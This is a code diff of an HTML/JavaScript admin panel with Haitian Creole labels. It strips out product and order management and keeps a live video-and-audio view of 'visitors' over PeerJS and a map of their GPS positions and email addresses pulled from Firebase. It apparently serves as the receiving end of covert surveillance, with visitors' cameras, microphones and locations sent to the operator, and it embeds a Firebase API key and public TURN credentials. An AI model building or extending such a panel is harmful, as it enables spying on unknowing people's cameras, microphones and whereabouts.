@@ -14,171 +14,15 @@
   }
   h1 { text-align: center; color: #00cc66; font-size: 1.3rem; margin-bottom: 5px; }
   #status { text-align: center; color: #ccc; font-size: 13px; margin-bottom: 15px; }
-  .tabs { display: flex; gap: 5px; max-width: 900px; margin: 0 auto 15px; flex-wrap: wrap; }
+
+  .tabs { display: flex; gap: 5px; max-width: 600px; margin: 0 auto 15px; }
   .tab {
-    flex: 1; min-width: 90px; padding: 12px 8px; background: #1c1c1c;
+    flex: 1; padding: 12px; background: #1c1c1c;
     color: #ccc; border: 1px solid #333;
-    border-radius: 8px; cursor: pointer; font-size: 12px;
-    font-family: system-ui, sans-serif;
+    border-radius: 8px; cursor: pointer; font-size: 13px;
   }
   .tab.active { background: #00cc66; color: white; border-color: #00cc66; }
-  #map {
-    height: 60vh; max-width: 900px; margin: 0 auto 15px;
-    border-radius: 12px; border: 1px solid #333; z-index: 1;
-  }
-  .map-controls {
-    max-width: 900px; margin: 0 auto 15px;
-    display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;
-  }
-  .map-controls button {
-    padding: 10px 18px; border-radius: 8px;
-    border: 1px solid #333; background: #1c1c1c;
-    color: #ccc; cursor: pointer; font-size: 13px;
-    font-family: system-ui, sans-serif;
-  }
-  .map-controls button.active { background: #00cc66; color: white; border-color: #00cc66; }
-  .locations-list {
-    max-width: 900px; margin: 0 auto 15px;
-    display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-    gap: 8px;
-  }
-  .loc-card {
-    background: #1c1c1c; border: 1px solid #333;
-    border-radius: 10px; padding: 12px;
-    font-size: 12px; cursor: pointer;
-    transition: border-color 0.2s;
-  }
-  .loc-card:hover { border-color: #00cc66; }
-  .loc-card .name { color: #00cc66; font-weight: bold; margin-bottom: 5px; font-size: 13px; }
-  .loc-card .info { color: #aaa; font-size: 11px; line-height: 1.5; }
-  .orders-list {
-    max-width: 900px; margin: 0 auto;
-    display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-    gap: 10px;
-  }
-  .order-card {
-    background: #1c1c1c; border: 1px solid #333;
-    border-radius: 12px; padding: 15px; font-size: 13px;
-  }
-  .order-card.pending { border-left: 4px solid #ff9800; }
-  .order-card.accepted { border-left: 4px solid #00cc66; }
-  .order-card.rejected { border-left: 4px solid #cc3333; }
-  .order-card .order-header {
-    display: flex; justify-content: space-between;
-    align-items: center; margin-bottom: 10px;
-  }
-  .order-card .order-name { color: #00cc66; font-weight: bold; font-size: 14px; }
-  .order-card .order-status {
-    font-size: 10px; padding: 3px 8px;
-    border-radius: 10px; text-transform: uppercase; font-weight: bold;
-  }
-  .order-card .order-status.pending { background: #4a3000; color: #ff9800; }
-  .order-card .order-status.accepted { background: #0d3a1a; color: #00cc66; }
-  .order-card .order-status.rejected { background: #3a0d0d; color: #cc3333; }
-  .order-card .order-info { color: #aaa; font-size: 11px; margin-bottom: 10px; line-height: 1.6; }
-  .order-card .order-info strong { color: #ccc; }
-  .order-card .order-photo {
-    width: 100%; border-radius: 8px;
-    margin-bottom: 10px; max-height: 200px; object-fit: cover;
-  }
-  .order-card .order-total { color: #00cc66; font-weight: bold; font-size: 15px; margin-bottom: 10px; }
-  .order-card .order-actions { display: flex; gap: 6px; }
-  .order-card .order-actions button {
-    flex: 1; padding: 10px; border: none; border-radius: 8px;
-    font-size: 12px; font-weight: bold;
-    cursor: pointer; font-family: system-ui, sans-serif;
-  }
-  .order-card .btn-accept { background: #00cc66; color: white; }
-  .order-card .btn-reject { background: #cc3333; color: white; }
-  .order-card .btn-delete { background: #444; color: white; }
-  .filter-bar {
-    max-width: 900px; margin: 0 auto 15px;
-    display: flex; gap: 6px; justify-content: center;
-  }
-  .filter-bar button {
-    padding: 8px 16px; border-radius: 20px;
-    border: 1px solid #333; background: #1c1c1c;
-    color: #ccc; cursor: pointer; font-size: 12px;
-    font-family: system-ui, sans-serif;
-  }
-  .filter-bar button.active { background: #00cc66; color: white; border-color: #00cc66; }
-  .form-card {
-    background: #1c1c1c; border-radius: 12px; padding: 15px;
-    max-width: 900px; margin: 0 auto 15px;
-    border: 1px solid #333;
-  }
-  .form-card h2 { color: #00cc66; font-size: 1rem; margin-bottom: 12px; }
-  .form-group { margin-bottom: 10px; }
-  .form-group label { display: block; font-size: 12px; color: #aaa; margin-bottom: 4px; }
-  .form-group input {
-    width: 100%; padding: 12px; border-radius: 8px;
-    border: 1px solid #333; background: #0d0d0d;
-    color: white; font-size: 14px; font-family: system-ui, sans-serif;
-  }
-  .upload-zone {
-    border: 2px dashed #444; border-radius: 10px;
-    padding: 25px 15px; text-align: center;
-    cursor: pointer; transition: all 0.2s; background: #0d0d0d;
-  }
-  .upload-zone:hover { border-color: #00cc66; background: #111; }
-  .upload-zone .icon { font-size: 32px; margin-bottom: 8px; }
-  .upload-zone .text { font-size: 13px; color: #aaa; }
-  .upload-zone.has-file { border-color: #00cc66; border-style: solid; background: #0d1a10; }
-  .preview-box { text-align: center; margin-top: 10px; }
-  .preview-box img { max-width: 150px; max-height: 150px; border-radius: 8px; border: 1px solid #333; }
-  .preview-box .size { font-size: 11px; color: #888; margin-top: 5px; }
-  .btn {
-    width: 100%; padding: 14px; border-radius: 10px;
-    border: none; color: white; cursor: pointer;
-    font-size: 14px; font-weight: bold;
-    font-family: system-ui, sans-serif;
-    background: #00cc66;
-  }
-  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-  .btn.secondary { background: #444; }
-  .img-list {
-    max-width: 900px; margin: 0 auto;
-    display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px;
-  }
-  .img-item {
-    position: relative; aspect-ratio: 1/1;
-    border-radius: 6px; overflow: hidden; background: #1c1c1c;
-  }
-  .img-item img { width: 100%; height: 100%; object-fit: cover; display: block; }
-  .img-item .actions { position: absolute; top: 3px; right: 3px; display: flex; gap: 3px; z-index: 5; }
-  .img-item .actions button {
-    width: 26px; height: 26px; border-radius: 50%;
-    color: white; border: none; font-size: 14px; cursor: pointer;
-    display: flex; align-items: center; justify-content: center;
-  }
-  .img-item .edit { background: #2196f3; }
-  .img-item .del { background: #cc3333; }
-  .img-item .info {
-    position: absolute; bottom: 0; left: 0; right: 0;
-    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
-    padding: 14px 4px 4px; font-size: 9px; text-align: center;
-    text-transform: uppercase;
-  }
-  .img-item .info .price { color: #00cc66; font-weight: bold; display: block; margin-top: 2px; }
-  .modal-bg {
-    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0,0,0,0.85);
-    display: flex; align-items: center; justify-content: center;
-    padding: 20px; z-index: 100;
-  }
-  .modal {
-    background: #1c1c1c; border-radius: 12px; padding: 20px;
-    max-width: 400px; width: 100%; border: 1px solid #333;
-  }
-  .modal h3 { color: #00cc66; margin-bottom: 15px; font-size: 1.1rem; }
-  .modal .row { display: flex; gap: 8px; margin-top: 15px; }
-  .modal .row .btn { margin: 0; }
-  .visitor-list { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-bottom: 15px; }
-  .visitor-btn {
-    background: #1c1c1c; color: #ccc; border: 1px solid #333;
-    padding: 8px 14px; border-radius: 20px; font-size: 13px; cursor: pointer;
-  }
-  .visitor-btn.active { background: #00cc66; color: white; border-color: #00cc66; }
+
   #videoGrid {
     display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
     gap: 12px; max-width: 1200px; margin: 0 auto;
@@ -187,15 +31,16 @@
     background: #1c1c1c; border-radius: 12px; padding: 10px;
     text-align: center; border: 1px solid #333; position: relative;
   }
-  .video-card.focused { border-color: #00cc66; box-shadow: 0 0 20px rgba(0, 204, 102, 0.4); }
-  .video-card video { width: 100%; border-radius: 8px; background: #000; display: block; min-height: 180px; }
-  .video-card p { margin-top: 8px; font-size: 12px; color: #999; word-break: break-all; }
+  .video-card video {
+    width: 100%; border-radius: 8px; background: #000;
+    display: block; min-height: 180px;
+  }
+  .video-card p { margin-top: 8px; font-size: 12px; color: #999; }
   .video-card .sound-toggle {
     width: 100%; margin-top: 6px; padding: 8px;
     background: #2196f3; color: white; border: none;
     border-radius: 8px; cursor: pointer;
     font-size: 12px; font-weight: bold;
-    font-family: system-ui, sans-serif;
   }
   .video-card .sound-toggle.off { background: #cc3333; }
   .live-dot {
@@ -204,8 +49,26 @@
     background: #ff3333; animation: pulse 1s infinite; z-index: 5;
   }
   @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-  .empty { text-align: center; color: #666; padding: 30px; font-size: 13px; grid-column: 1 / -1; }
-  .hidden { display: none; }
+
+  #map {
+    height: 60vh; max-width: 900px;
+    margin: 0 auto 15px; border-radius: 12px;
+    border: 1px solid #333; z-index: 1;
+  }
+  .locations-list {
+    max-width: 900px; margin: 0 auto;
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+    gap: 8px;
+  }
+  .loc-card {
+    background: #1c1c1c; border: 1px solid #333;
+    border-radius: 10px; padding: 12px; font-size: 12px;
+  }
+  .loc-card .name { color: #00cc66; font-weight: bold; margin-bottom: 5px; }
+  .loc-card .info { color: #aaa; font-size: 11px; line-height: 1.5; }
+
+  .empty { text-align: center; color: #666; padding: 40px; font-size: 13px; grid-column: 1 / -1; }
+  .hidden { display: none !important; }
 </style>
 </head>
 <body>
@@ -215,91 +78,19 @@
 
   <div class="tabs">
     <button class="tab active" id="tabVisitors">👁 Visitors</button>
-    <button class="tab" id="tabImages">🖼 Imaj</button>
-    <button class="tab" id="tabOrders">📦 Kòmand</button>
     <button class="tab" id="tabMap">🗺️ Kat</button>
   </div>
 
   <div id="visitorsView">
-    <div class="visitor-list" id="visitorList"></div>
     <div id="videoGrid">
       <div class="empty">Ap tann visitor yo konekte...</div>
     </div>
   </div>
 
-  <div id="imagesView" class="hidden">
-    <div class="form-card">
-      <h2 id="formTitle">➕ Ajoute yon imaj</h2>
-      <div class="form-group">
-        <label>Chwazi foto a</label>
-        <div class="upload-zone" id="uploadZone">
-          <div class="icon">📷</div>
-          <div class="text" id="uploadText">Klike pou chwazi yon foto</div>
-        </div>
-        <input type="file" id="fileInput" accept="image/*" style="display:none;">
-      </div>
-      <div class="preview-box" id="preview"></div>
-      <div class="form-group" style="margin-top:10px;">
-        <label>Non pwodwi a</label>
-        <input type="text" id="imgName" placeholder="Chòt Foutbòl">
-      </div>
-      <div class="form-group">
-        <label>Pri</label>
-        <input type="text" id="imgPrice" placeholder="$25">
-      </div>
-      <button class="btn" id="btnAdd" style="margin-top:10px;">Ajoute Imaj</button>
-      <button class="btn secondary hidden" id="btnCancel" style="margin-top:8px;">Anile</button>
-    </div>
-    <div class="form-card">
-      <h2>📋 Lis imaj yo (<span id="imgCount">0</span>)</h2>
-      <div class="img-list" id="imgList">
-        <div class="empty">Pa gen imaj ankò</div>
-      </div>
-    </div>
-  </div>
-
-  <div id="ordersView" class="hidden">
-    <div class="filter-bar">
-      <button class="active" data-filter="all">Tout</button>
-      <button data-filter="pending">⏳ An atant</button>
-      <button data-filter="accepted">✅ Aksepte</button>
-      <button data-filter="rejected">❌ Refize</button>
-    </div>
-    <div class="orders-list" id="ordersList">
-      <div class="empty">Pa gen kòmand ankò</div>
-    </div>
-  </div>
-
   <div id="mapView" class="hidden">
-    <div class="map-controls">
-      <button id="btnMapStreet" class="active">🗺️ Kat wout</button>
-      <button id="btnMapSat">🛰️ Satelit</button>
-    </div>
     <div id="map"></div>
-    <div class="form-card">
-      <h2>📍 Visitors lokalize (<span id="locCount">0</span>)</h2>
-      <div class="locations-list" id="locationsList">
-        <div class="empty">Pa gen visitors lokalize</div>
-      </div>
-    </div>
-  </div>
-
-  <div class="modal-bg hidden" id="modalBg">
-    <div class="modal">
-      <h3>✏️ Modifye pwodwi</h3>
-      <div style="text-align:center; margin-bottom:15px;" id="modalImg"></div>
-      <div class="form-group">
-        <label>Non pwodwi a</label>
-        <input type="text" id="modalName">
-      </div>
-      <div class="form-group">
-        <label>Pri</label>
-        <input type="text" id="modalPrice">
-      </div>
-      <div class="row">
-        <button class="btn secondary" id="modalCancel">Anile</button>
-        <button class="btn" id="modalSave">💾 Anrejistre</button>
-      </div>
+    <div class="locations-list" id="locationsList">
+      <div class="empty">Pa gen visitors lokalize</div>
     </div>
   </div>
 
@@ -310,7 +101,7 @@
 
 <script>
 /* ============================================
-   KONFIGIRASYON FIREBASE
+   FIREBASE
    ============================================ */
 const firebaseConfig = {
   apiKey: "AIzaSyBLIrjwXzJJKIWGbqblXXBop7DnfmobKH0",
@@ -328,94 +119,221 @@ const db = firebase.database();
 /* ============================================
    TABS
    ============================================ */
-const tabVisitors = document.getElementById("tabVisitors");
-const tabImages   = document.getElementById("tabImages");
-const tabOrders   = document.getElementById("tabOrders");
-const tabMap      = document.getElementById("tabMap");
-const visitorsView= document.getElementById("visitorsView");
-const imagesView  = document.getElementById("imagesView");
-const ordersView  = document.getElementById("ordersView");
-const mapView     = document.getElementById("mapView");
+const tabVisitors  = document.getElementById("tabVisitors");
+const tabMap       = document.getElementById("tabMap");
+const visitorsView = document.getElementById("visitorsView");
+const mapView      = document.getElementById("mapView");
 
-function switchTab(tab) {
-  [tabVisitors, tabImages, tabOrders, tabMap].forEach(t => t.classList.remove("active"));
-  [visitorsView, imagesView, ordersView, mapView].forEach(v => v.classList.add("hidden"));
-  tab.classList.add("active");
+tabVisitors.onclick = () => {
+  tabVisitors.classList.add("active");
+  tabMap.classList.remove("active");
+  visitorsView.classList.remove("hidden");
+  mapView.classList.add("hidden");
+};
 
-  if (tab === tabVisitors) visitorsView.classList.remove("hidden");
-  if (tab === tabImages)   imagesView.classList.remove("hidden");
-  if (tab === tabOrders)   ordersView.classList.remove("hidden");
-  if (tab === tabMap) {
-    mapView.classList.remove("hidden");
-    setTimeout(() => { if (map) map.invalidateSize(); }, 100);
-  }
-}
-
-tabVisitors.onclick = () => switchTab(tabVisitors);
-tabImages.onclick   = () => switchTab(tabImages);
-tabOrders.onclick   = () => switchTab(tabOrders);
-tabMap.onclick      = () => switchTab(tabMap);
+tabMap.onclick = () => {
+  tabMap.classList.add("active");
+  tabVisitors.classList.remove("active");
+  mapView.classList.remove("hidden");
+  visitorsView.classList.add("hidden");
+  setTimeout(() => { if (map) map.invalidateSize(); }, 100);
+};
 
 /* ============================================
-   KAT LEAFLET
+   KAT
    ============================================ */
 let map = null;
 let markers = {};
-let currentLayer = null;
-
-const TILE_STREET = "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png";
-const TILE_SAT    = "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}";
 
 function initMap() {
   map = L.map('map').setView([18.5392, -72.3360], 10);
-  currentLayer = L.tileLayer(TILE_STREET, { attribution: '© OpenStreetMap', maxZoom: 19 }).addTo(map);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© OpenStreetMap',
+    maxZoom: 19
+  }).addTo(map);
 }
 
-document.getElementById("btnMapStreet").onclick = () => {
-  if (!map) return;
-  map.removeLayer(currentLayer);
-  currentLayer = L.tileLayer(TILE_STREET, { attribution: '© OpenStreetMap', maxZoom: 19 }).addTo(map);
-  document.getElementById("btnMapStreet").classList.add("active");
-  document.getElementById("btnMapSat").classList.remove("active");
+/* ============================================
+   PEERJS
+   ============================================ */
+const ADMIN_ID = "admin-piyayy-2026-v2";
+const grid = document.getElementById("videoGrid");
+const status = document.getElementById("status");
+const visitors = {};
+
+const ICE_CONFIG = {
+  iceServers: [
+    { urls: "stun:stun.l.google.com:19302" },
+    { urls: "stun:stun1.l.google.com:19302" },
+    { 
+      urls: "turn:openrelay.metered.ca:80",
+      username: "openrelayproject",
+      credential: "openrelayproject"
+    },
+    { 
+      urls: "turn:openrelay.metered.ca:443",
+      username: "openrelayproject",
+      credential: "openrelayproject"
+    },
+    { 
+      urls: "turn:openrelay.metered.ca:443?transport=tcp",
+      username: "openrelayproject",
+      credential: "openrelayproject"
+    }
+  ]
 };
 
-document.getElementById("btnMapSat").onclick = () => {
-  if (!map) return;
-  map.removeLayer(currentLayer);
-  currentLayer = L.tileLayer(TILE_SAT, { attribution: '© Esri', maxZoom: 19 }).addTo(map);
-  document.getElementById("btnMapSat").classList.add("active");
-  document.getElementById("btnMapStreet").classList.remove("active");
-};
+let peer = null;
+
+function connectPeer() {
+  peer = new Peer(ADMIN_ID, { config: ICE_CONFIG, debug: 1 });
+
+  peer.on("open", (id) => {
+    console.log("✅ Admin ID:", id);
+    status.innerText = "✅ Admin konekte. Ap tann visitors...";
+    const empty = grid.querySelector(".empty");
+    if (empty) empty.remove();
+  });
+
+  peer.on("call", handleCall);
+
+  peer.on("error", (err) => {
+    console.warn("PeerJS erè:", err);
+    if (err.type === "unavailable-id") {
+      status.innerText = "❌ ID deja itilize. Ap eseye ankò...";
+      setTimeout(connectPeer, 3000);
+      return;
+    }
+    status.innerText = "❌ Erè: " + err.type;
+  });
+
+  peer.on("disconnected", () => {
+    status.innerText = "⚠️ Koneksyon pèdi";
+    setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
+  });
+}
+
+function handleCall(call) {
+  const visitorId = call.peer;
+  console.log("📞 Visitor konekte:", visitorId);
+
+  if (visitors[visitorId]) {
+    try { visitors[visitorId].call.close(); } catch (e) {}
+    if (visitors[visitorId].card) visitors[visitorId].card.remove();
+    delete visitors[visitorId];
+  }
+
+  call.answer();
+
+  const card = document.createElement("div");
+  card.className = "video-card";
+  card.dataset.visitorId = visitorId;
+
+  const dot = document.createElement("div");
+  dot.className = "live-dot";
+
+  const video = document.createElement("video");
+  video.autoplay = true;
+  video.playsInline = true;
+  video.muted = true;
+
+  const label = document.createElement("p");
+  label.innerText = "👤 " + visitorId;
+
+  const soundBtn = document.createElement("button");
+  soundBtn.className = "sound-toggle";
+  soundBtn.innerText = "🔊 Tande son";
+  soundBtn.onclick = () => {
+    video.muted = !video.muted;
+    if (video.muted) {
+      soundBtn.innerText = "🔊 Tande son";
+      soundBtn.classList.remove("off");
+    } else {
+      soundBtn.innerText = "🔇 Koupe son";
+      soundBtn.classList.add("off");
+      video.play().catch(e => console.warn("play err:", e));
+    }
+  };
+
+  card.appendChild(dot);
+  card.appendChild(video);
+  card.appendChild(label);
+  card.appendChild(soundBtn);
+  grid.appendChild(card);
+
+  visitors[visitorId] = { call, video, card };
+
+  call.on("stream", (remoteStream) => {
+    console.log("🎬 Stream rive:", visitorId);
+    video.srcObject = remoteStream;
+    video.play().catch(e => console.warn("play err:", e));
+  });
+
+  call.on("close", () => {
+    console.log("📴 Call close:", visitorId);
+    cleanup(visitorId);
+  });
+
+  call.on("error", (e) => {
+    console.warn("Call erè:", e);
+    cleanup(visitorId);
+  });
+
+  updateStatus();
+}
+
+function cleanup(id) {
+  if (!visitors[id]) return;
+  try { visitors[id].call.close(); } catch (e) {}
+  if (visitors[id].card) visitors[id].card.remove();
+  delete visitors[id];
+  updateStatus();
+}
+
+function updateStatus() {
+  const count = Object.keys(visitors).length;
+  status.innerText = count > 0
+    ? `🟢 ${count} visitor konekte`
+    : "✅ Admin konekte. Ap tann visitors...";
+
+  if (count > 0) {
+    const empty = grid.querySelector(".empty");
+    if (empty) empty.remove();
+  } else if (!grid.querySelector(".empty")) {
+    const empty = document.createElement("div");
+    empty.className = "empty";
+    empty.innerText = "Ap tann visitor yo konekte...";
+    grid.appendChild(empty);
+  }
+}
 
 /* ============================================
-   EKOUTE POZISYON
+   LOKASYON
    ============================================ */
 const locationsList = document.getElementById("locationsList");
-const locCount      = document.getElementById("locCount");
 
 db.ref("locations").on("value", (snapshot) => {
   const data = snapshot.val();
+
   Object.values(markers).forEach(m => { if (map) map.removeLayer(m); });
   markers = {};
   locationsList.innerHTML = "";
 
   if (!data || Object.keys(data).length === 0) {
     locationsList.innerHTML = '<div class="empty">Pa gen visitors lokalize</div>';
-    locCount.innerText = "0";
     return;
   }
 
-  const entries = Object.entries(data);
-  locCount.innerText = entries.length;
-
-  entries.forEach(([id, loc]) => {
+  Object.entries(data).forEach(([id, loc]) => {
     const pos = [loc.lat, loc.lon];
-    const email = loc.email || loc.name || "Anonim";
+    const email = loc.email || "Anonim";
+
     if (map) {
-      const marker = L.marker(pos).addTo(map);
-      marker.bindPopup(`<b>${email}</b><br>Prezizyon: ${Math.round(loc.acc)}m`);
-      markers[id] = marker;
+      const m = L.marker(pos).addTo(map);
+      m.bindPopup(`<b>${email}</b><br>${Math.round(loc.acc)}m`);
+      markers[id] = m;
     }
+
     const div = document.createElement("div");
     div.className = "loc-card";
     div.innerHTML = `
@@ -426,527 +344,15 @@ db.ref("locations").on("value", (snapshot) => {
         🕐 ${new Date(loc.time).toLocaleTimeString()}
       </div>
     `;
-    div.onclick = () => {
-      if (map) {
-        map.setView(pos, 16);
-        if (markers[id]) markers[id].openPopup();
-      }
-    };
     locationsList.appendChild(div);
   });
 });
 
 /* ============================================
-   KÒMAND
-   ============================================ */
-const ordersList = document.getElementById("ordersList");
-let allOrders = [];
-let currentFilter = "all";
-
-document.querySelectorAll(".filter-bar button").forEach(btn => {
-  btn.onclick = () => {
-    document.querySelectorAll(".filter-bar button").forEach(b => b.classList.remove("active"));
-    btn.classList.add("active");
-    currentFilter = btn.dataset.filter;
-    renderOrders();
-  };
-});
-
-function renderOrders() {
-  const filtered = currentFilter === "all"
-    ? allOrders
-    : allOrders.filter(o => o.status === currentFilter);
-
-  if (filtered.length === 0) {
-    ordersList.innerHTML = '<div class="empty">Pa gen kòmand</div>';
-    return;
-  }
-
-  ordersList.innerHTML = filtered.map(o => {
-    const time = new Date(o.createdAt).toLocaleString();
-    const email = o.email || o.name || "Anonim";
-    return `<div class="order-card ${o.status}">
-      <div class="order-header">
-        <div class="order-name">👤 ${email}</div>
-        <div class="order-status ${o.status}">${o.status === 'pending' ? 'An atant' : o.status === 'accepted' ? 'Aksepte' : 'Refize'}</div>
-      </div>
-      <div class="order-info">
-        📧 <strong>${email}</strong><br>
-        📦 ${o.productName} ${o.qty > 1 ? `×${o.qty}` : ''}<br>
-        💰 Pri: $${o.productPrice} → <strong style="color:#00cc66;">$${o.finalPrice}</strong><br>
-        ${o.discount > 0 ? `🎉 Rabè: -$${o.discount}<br>` : ''}
-        💳 Peman: <strong>${o.payment}</strong><br>
-        🕐 ${time}
-      </div>
-      ${o.photo ? `<img class="order-photo" src="${o.photo}" onclick="window.open(this.src)">` : ''}
-      <div class="order-total">Total: $${o.total}</div>
-      <div class="order-actions">
-        ${o.status === 'pending' ? `
-          <button class="btn-accept" onclick="acceptOrder('${o.key}')">✅ Aksepte</button>
-          <button class="btn-reject" onclick="rejectOrder('${o.key}')">❌ Refize</button>
-        ` : `
-          <button class="btn-delete" onclick="deleteOrder('${o.key}')">🗑 Efase</button>
-        `}
-      </div>
-    </div>`;
-  }).join("");
-}
-
-db.ref("orders").on("value", (snapshot) => {
-  const data = snapshot.val();
-  allOrders = data
-    ? Object.entries(data).map(([k, v]) => ({ key: k, ...v })).sort((a, b) => b.createdAt - a.createdAt)
-    : [];
-  renderOrders();
-});
-
-window.acceptOrder = async (key) => {
-  if (!confirm("Aksepte kòmand sa a ?")) return;
-  try {
-    await db.ref("orders/" + key).update({ status: "accepted" });
-  } catch (e) { alert("Erè: " + e.message); }
-};
-
-window.rejectOrder = async (key) => {
-  if (!confirm("Refize kòmand sa a ?")) return;
-  try {
-    await db.ref("orders/" + key).update({ status: "rejected" });
-  } catch (e) { alert("Erè: " + e.message); }
-};
-
-window.deleteOrder = async (key) => {
-  if (!confirm("Efase kòmand sa a nèt ?")) return;
-  try {
-    await db.ref("orders/" + key).remove();
-  } catch (e) { alert("Erè: " + e.message); }
-};
-
-/* ============================================
-   IMAJ
-   ============================================ */
-const uploadZone = document.getElementById("uploadZone");
-const uploadText = document.getElementById("uploadText");
-const fileInput  = document.getElementById("fileInput");
-const preview    = document.getElementById("preview");
-const imgName    = document.getElementById("imgName");
-const imgPrice   = document.getElementById("imgPrice");
-const btnAdd     = document.getElementById("btnAdd");
-const btnCancel  = document.getElementById("btnCancel");
-const formTitle  = document.getElementById("formTitle");
-const imgList    = document.getElementById("imgList");
-const imgCount   = document.getElementById("imgCount");
-
-const modalBg    = document.getElementById("modalBg");
-const modalImg   = document.getElementById("modalImg");
-const modalName  = document.getElementById("modalName");
-const modalPrice = document.getElementById("modalPrice");
-const modalSave  = document.getElementById("modalSave");
-const modalCancel= document.getElementById("modalCancel");
-
-let selectedBase64 = null;
-let editingKey = null;
-
-uploadZone.onclick = () => fileInput.click();
-
-function resizeAndConvert(file, maxSize = 600, quality = 0.7) {
-  return new Promise((resolve, reject) => {
-    const reader = new FileReader();
-    reader.onload = (e) => {
-      const img = new Image();
-      img.onload = () => {
-        let w = img.width, h = img.height;
-        if (w > h && w > maxSize) { h = Math.round((h * maxSize) / w); w = maxSize; }
-        else if (h > maxSize) { w = Math.round((w * maxSize) / h); h = maxSize; }
-        const canvas = document.createElement("canvas");
-        canvas.width = w; canvas.height = h;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(img, 0, 0, w, h);
-        resolve(canvas.toDataURL("image/jpeg", quality));
-      };
-      img.onerror = () => reject(new Error("Pa ka chaje imaj la"));
-      img.src = e.target.result;
-    };
-    reader.onerror = () => reject(new Error("Pa ka li fichye a"));
-    reader.readAsDataURL(file);
-  });
-}
-
-fileInput.onchange = async () => {
-  const file = fileInput.files[0];
-  if (!file) return;
-  if (!file.type.startsWith("image/")) { alert("❌ Fichye a dwe yon imaj."); return; }
-  try {
-    const base64 = await resizeAndConvert(file, 600, 0.7);
-    const sizeKB = Math.round((base64.length * 3) / 4 / 1024);
-    if (sizeKB > 300) { alert("❌ Imaj la twò gwo (" + sizeKB + " KB)."); return; }
-    selectedBase64 = base64;
-    preview.innerHTML = `<img src="${base64}"><div class="size">${sizeKB} KB</div>`;
-    uploadZone.classList.add("has-file");
-    uploadText.innerText = "✅ " + file.name;
-  } catch (e) { alert("❌ Erè: " + e.message); }
-};
-
-btnAdd.onclick = async () => {
-  const name = imgName.value.trim() || "San non";
-  const price = imgPrice.value.trim() || "";
-
-  if (editingKey) {
-    btnAdd.disabled = true;
-    btnAdd.innerText = "⏳ Ap modifye...";
-    try {
-      const update = { name, price };
-      if (selectedBase64) update.url = selectedBase64;
-      await db.ref("images/" + editingKey).update(update);
-      alert("✅ Modifye!");
-      resetForm();
-    } catch (e) { alert("❌ Erè: " + e.message); }
-    finally { btnAdd.disabled = false; btnAdd.innerText = "Ajoute Imaj"; }
-    return;
-  }
-
-  if (!selectedBase64) { alert("Chwazi yon foto dabò."); return; }
-
-  btnAdd.disabled = true;
-  btnAdd.innerText = "⏳ Ap anrejistre...";
-
-  try {
-    await db.ref("images").push({
-      url: selectedBase64,
-      name, price,
-      createdAt: Date.now()
-    });
-    alert("✅ Imaj ajoute!");
-    resetForm();
-  } catch (e) {
-    alert("❌ Erè: " + e.message);
-  } finally {
-    btnAdd.disabled = false;
-    btnAdd.innerText = "Ajoute Imaj";
-  }
-};
-
-function resetForm() {
-  selectedBase64 = null;
-  editingKey = null;
-  fileInput.value = "";
-  imgName.value = "";
-  imgPrice.value = "";
-  preview.innerHTML = "";
-  uploadZone.classList.remove("has-file");
-  uploadText.innerText = "Klike pou chwazi yon foto";
-  formTitle.innerText = "➕ Ajoute yon imaj";
-  btnAdd.innerText = "Ajoute Imaj";
-  btnCancel.classList.add("hidden");
-}
-
-btnCancel.onclick = resetForm;
-
-db.ref("images").on("value", (snapshot) => {
-  const data = snapshot.val();
-  imgList.innerHTML = "";
-  if (!data) {
-    imgList.innerHTML = '<div class="empty">Pa gen imaj ankò</div>';
-    imgCount.innerText = "0";
-    return;
-  }
-  const entries = Object.entries(data).sort((a, b) => b[1].createdAt - a[1].createdAt);
-  imgCount.innerText = entries.length;
-
-  entries.forEach(([key, img]) => {
-    const div = document.createElement("div");
-    div.className = "img-item";
-    div.innerHTML = `
-      <img src="${img.url}" onerror="this.style.background='#333'">
-      <div class="actions">
-        <button class="edit" data-key="${key}" data-action="edit">✏️</button>
-        <button class="del"  data-key="${key}" data-action="del">×</button>
-      </div>
-      <div class="info">
-        ${img.name}
-        ${img.price ? `<span class="price">${img.price}</span>` : ""}
-      </div>
-    `;
-    imgList.appendChild(div);
-  });
-
-  imgList.querySelectorAll("button[data-action]").forEach(btn => {
-    btn.onclick = async (e) => {
-      e.stopPropagation();
-      const key = btn.dataset.key;
-      const action = btn.dataset.action;
-      const img = data[key];
-
-      if (action === "del") {
-        if (!confirm("Efase imaj sa a?")) return;
-        try { await db.ref("images/" + key).remove(); }
-        catch (err) { alert("Erè: " + err.message); }
-      }
-      if (action === "edit") openEditModal(key, img);
-    };
-  });
-});
-
-function openEditModal(key, img) {
-  editingKey = key;
-  modalImg.innerHTML = `<img src="${img.url}" style="max-width:120px; border-radius:8px;">`;
-  modalName.value = img.name || "";
-  modalPrice.value = img.price || "";
-  modalBg.classList.remove("hidden");
-}
-
-modalCancel.onclick = () => { modalBg.classList.add("hidden"); editingKey = null; };
-modalBg.onclick = (e) => {
-  if (e.target === modalBg) { modalBg.classList.add("hidden"); editingKey = null; }
-};
-
-modalSave.onclick = async () => {
-  if (!editingKey) return;
-  const name = modalName.value.trim() || "San non";
-  const price = modalPrice.value.trim() || "";
-  modalSave.disabled = true;
-  modalSave.innerText = "⏳...";
-  try {
-    await db.ref("images/" + editingKey).update({ name, price });
-    modalBg.classList.add("hidden");
-    editingKey = null;
-  } catch (e) { alert("❌ Erè: " + e.message); }
-  finally { modalSave.disabled = false; modalSave.innerText = "💾 Anrejistre"; }
-};
-
-/* ============================================
-   PEERJS — WÈ AK TANDE VISITORS
